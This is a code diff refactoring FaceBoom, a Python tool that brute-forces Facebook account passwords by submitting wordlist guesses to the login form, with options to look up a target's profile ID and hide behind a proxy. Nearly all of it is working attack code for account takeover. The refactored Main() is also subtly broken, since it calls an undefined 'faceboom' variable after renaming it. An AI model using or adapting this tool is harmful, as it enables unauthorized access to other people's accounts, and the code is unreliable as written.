@@ -10,9 +10,7 @@ rd="\033[1;31m" #>Red   #
 gr="\033[1;32m" #>Green #
 yl="\033[1;33m" #>Yellow#
 #########################
-
 os.system("cls||clear")
-
 def write(text):
     sys.stdout.write(text)
     sys.stdout.flush()
@@ -34,8 +32,8 @@ except ImportError:
 class FaceBoom(object):
 
 
-    def __init__(self, target=None, target_profile=None,single_passwd=None, wordlist=None, proxy=None):
-
+    def __init__(self):
+        self.useProxy = None
         self.br = mechanize.Browser()
         self.br.set_handle_robots(False)
         self.br._factory.is_html = True
@@ -47,41 +45,6 @@ class FaceBoom(object):
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
                'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]
-        self.target = target
-        self.target_profile = target_profile
-        self.single_passwd = single_passwd
-        self.wordlist = wordlist
-        self.proxy = proxy
-        self.useProxy = None
-
-
-    def checks(self):
-        if self.wordlist:
-            if not os.path.isfile(self.wordlist):
-                errMsg("Please check Your Wordlist Path")
-                sys.exit(1)
-        elif self.single_passwd:
-            if len(self.single_passwd.strip()) < 6:
-                errMsg("Invalid Password")
-                print("[!] Password must be at least '6' characters long")
-                sys.exit(1)
-        elif not self.cnet():
-            errMsg("Please Check Your Internet Connection")
-            sys.exit(1)
-        else:
-             if self.proxy.count(".") != 3:
-                    errMsg("Invalid IPv4 ["+rd+str(self.proxy)+yl+"]")
-                    sys.exit(1)
-             print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(self.proxy if not ":" in self.proxy else self.proxy.split(":")[0]))
-             check = self.proxy+":8080" if not ":" in self.proxy else self.proxy
-             if self.check_proxy(check):
-                print(wi+"["+gr+"Connected"+wi+"]")
-                self.useProxy = check
-                self.br.set_proxies({'https':self.useProxy, 'http':self.useProxy})
-             else:
-                errMsg("Connection Failed")
-                errMsg("Unable to connect to Proxy["+rd+str(self.proxy)+yl+"]")
-                sys.exit(1)
 
 
     @staticmethod
@@ -104,12 +67,11 @@ class FaceBoom(object):
         return False
 
 
-    def get_profile_id(self):
-        proxies = {} if not self.useProxy else {'https':self.useProxy, 'http':self.useProxy}
+    def get_profile_id(self, target_profile):
         try:
             print(gr+"\n["+wi+"*"+gr+"] geting target Profile Id... please wait"+wi)
             idre = re.compile('"entity_id":"([0-9]+)"')
-            con = requests.get(self.target_profile, proxies=proxies, timeout=5).text
+            con = requests.get(target_profile).text
             idis = idre.findall(con)
             print(wi+"\n["+gr+"+"+wi+"]"+gr+" Target Profile"+wi+" ID: "+yl+idis[0]+wi)
         except IndexError:
@@ -117,12 +79,12 @@ class FaceBoom(object):
             sys.exit(1)
 
 
-    def login(self, password):
+    def login(self,target, password):
 
         try:
             self.br.open("https://facebook.com")
             self.br.select_form(nr=0)
-            self.br.form['email']=self.target
+            self.br.form['email']=target
             self.br.form['pass']= password
             self.br.method ="POST"
             return  self.br.submit().get_data().__contains__(b'home_icon')
@@ -131,14 +93,11 @@ class FaceBoom(object):
             time.sleep(1.5)
             sys.exit(1)
         except Exception as e:
-            if self.single_passwd:
-                print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
-                sys.exit(1)
             print(rd+" Error: "+yl+str(e)+wi+"\n")
             time.sleep(0.60)
 
 
-    def banner(self):
+    def banner(self,target,wordlist,single_passwd):
 
         proxystatus = gr+self.useProxy+wi+"["+gr+"ON"+wi+"]" if self.useProxy  else yl+"["+rd+"OFF"+yl+"]"
         print(gr+"""
@@ -149,14 +108,15 @@ class FaceBoom(object):
 ==================================
 [---]         """+yl+"""CONFIG"""+gr+"""         [---]
 ==================================
-[>] Target      :> """+wi+self.target+gr+"""
-{}""".format("[>] Wordlist    :> "+yl+str(self.wordlist) if not self.single_passwd else "[>] Password    :> "+yl+str(self.single_passwd))+gr+"""
+[>] Target      :> """+wi+target+gr+"""
+{}""".format("[>] Wordlist    :> "+yl+str(wordlist) if not single_passwd else "[>] Password    :> "+yl+str(single_passwd))+gr+"""
 [>] ProxyStatus :> """+str(proxystatus)+wi)
-        if not self.single_passwd:
+        if not single_passwd:
             print(gr+"""\
 =================================="""+wi+"""
 [~] """+yl+"""Brute"""+rd+""" ForceATTACK: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
 ==================================\n"""+wi)
+        else:print("\n")
 
 
     @staticmethod
@@ -213,41 +173,66 @@ Examples:
 
 
 def Main():
-   parse.add_option("-t","--target",'-T','--TARGET',dest="taremail",type="string",
-      help="Specify Target Email ")
-   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wlst",type="string",
+   parse.add_option("-t","--target",'-T','--TARGET',dest="target",type="string",
+      help="Specify Target Email or ID")
+   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wordlist",type="string",
       help="Specify Wordlist File ")
    parse.add_option("-s","--single","--S","--SINGLE",dest="single",type="string",
       help="Specify Single Password To Check it")
    parse.add_option("-p","-P","--proxy","--PROXY",dest="proxy",type="string",
-                        help="Specify HTTP/S Proxy To Be Anonymous When Attack Enable")
+                        help="Specify HTTP/S Proxy to be used")
    parse.add_option("-g","-G","--getid","--GETID",dest="url",type="string",
-                        help="Specify TARGET FACEBOOK PROFILE URL")
+                        help="Specify TARGET FACEBOOK PROFILE URL to get his ID")
    parse.add_option("-u","-U","--update","--UPDATE", dest="update", action="store_true", default=False)
    (options,args) = parse.parse_args()
-   faceboom = FaceBoom()
-   if options.update:
+   faceBoom = FaceBoom()
+   if not faceBoom.cnet():
+       errMsg("Please Check Your Internet Connection")
+       sys.exit(1)
+   target = options.target
+   wordlist = options.wordlist
+   single_passwd = options.single
+   proxy = options.proxy
+   target_profile = options.url
+   update = options.update
+   if update:
     faceboom.updateFaceBoom()
     sys.exit(1)
-
-   elif options.taremail != None or options.url != None:
-    faceboom.target = options.taremail
-    faceboom.target_profile = options.url
-    faceboom.wordlist = options.wlst
-    faceboom.single_passwd = options.single
-    faceboom.proxy = options.proxy
-    faceboom.checks()
-    if faceboom.target_profile:
-        faceboom.get_profile_id()
+   elif target_profile:
+        faceboom.get_profile_id(target_profile)
         sys.exit(1)
-    if faceboom.wordlist or faceboom.single_passwd:
-            faceboom.banner()
-            loop,passwords = (1,open(faceboom.wordlist).readlines()) if not faceboom.single_passwd else ("~",[faceboom.single_passwd])
-            for passwd in passwords:
+   elif wordlist or single_passwd:
+        if wordlist:
+            if not os.path.isfile(wordlist):
+                errMsg("Please check Your Wordlist Path")
+                sys.exit(1)
+        if single_passwd:
+            if len(single_passwd.strip()) < 6:
+                errMsg("Invalid Password")
+                print("[!] Password must be at least '6' characters long")
+                sys.exit(1)
+        if proxy:
+             if proxy.count(".") != 3:
+                    errMsg("Invalid IPv4 ["+rd+str(proxy)+yl+"]")
+                    sys.exit(1)
+             print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(proxy if not ":" in proxy else proxy.split(":")[0]))
+             final_proxy = proxy+":8080" if not ":" in proxy else proxy
+             if faceBoom.check_proxy(final_proxy):
+                faceBoom.useProxy = final_proxy
+                faceBoom.br.set_proxies({'https':faceBoom.useProxy, 'http':faceBoom.useProxy})
+                print(wi+"["+gr+"Connected"+wi+"]")
+             else:
+                errMsg("Connection Failed")
+                errMsg("Unable to connect to Proxy["+rd+str(proxy)+yl+"]")
+                sys.exit(1)
+
+        faceBoom.banner(target,wordlist,single_passwd)
+        loop,passwords = (1,open(wordlist).readlines()) if not single_passwd else ("~",[single_passwd])
+        for passwd in passwords:
                 passwd = passwd.strip()
                 if len(passwd) <6:continue
                 write(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
-                if faceboom.login(passwd):
+                if faceBoom.login(target, passwd):
                     sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
                     print(wi+"========================="+"="*len(passwd)+"======")
                     print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
@@ -255,20 +240,24 @@ def Main():
                     break
                 else:
                     sys.stdout.write(yl+" ==> Login"+rd+" Failed\n")
-                    loop = loop + 1 if loop != "~" else "~"
-            else:
-                if faceboom.single_passwd:
+                    loop = loop + 1 if not single_passwd else "~"
+        else:
+                if single_passwd:
                     print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"The Password[ "+yl+passwd+wi+" ] Is Not Correct"+rd+":("+yl+"!"+wi)
                     print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another password or Wordlist "+gr+":)"+wi)
                 else:
-                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+faceboom.wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
+                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
                     print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another Wordlist. "+gr+":)"+wi)
-            sys.exit(1)
-   print(parse.usage)
-   sys.exit(1)
+        sys.exit(1)
+   else:
+       print(parse.usage)
+       sys.exit(1)
+
+
 
 if __name__=='__main__':
     Main()
+
 
 ##############################################################
 #####################                #########################
